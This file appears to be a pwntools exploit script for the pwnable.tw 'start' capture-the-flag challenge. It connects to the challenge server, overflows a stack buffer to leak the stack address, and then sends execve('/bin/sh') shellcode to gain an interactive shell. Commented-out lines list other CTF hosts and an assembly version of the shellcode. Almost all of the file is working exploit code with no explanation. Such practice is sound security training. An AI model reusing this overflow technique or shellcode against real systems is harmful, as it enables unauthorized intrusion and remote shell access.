from pwn import *
from LibcSearcher import *

# io = remote("192.168.170.128", 9999)
# context.arch = "amd64"

io = remote("chall.pwnable.tw", 10000)
# io = remote("61.147.171.105",   51565)
# p = remote("node4.buuoj.cn", 28576)
# io = remote("node4.anna.nssctf.cn", 28341)
# io = process('./start')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./hello')
# libc = ELF('./libc-2.23.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    return (io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =",addr)


# context(os='linux', arch='amd64')
# context(os='linux', arch = 'i386', log_level = "debug")

ru("CTF:")
s(b'a' * 20 + p32(0x08048087))
esp_exit = u32(io.recv()[:4])

print("esp_exit =", hex(esp_exit))
# payload = b'a' * 20 + p32(esp_exit + 0x14) #sub esp 0x14

# shellcode_0 = """
# xor    eax,eax
# push   eax
# push   0x68732f2f
# push   0x6e69622f
# mov    esp,ebx
# push   eax
# push   ebx
# mov    esp,ecx
# mov    0xb,al
# int    0x80
# """

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = b'a' * 20 + p32(esp_exit + 0x14) + shellcode
# ru("CTF:")
s(payload)

inter()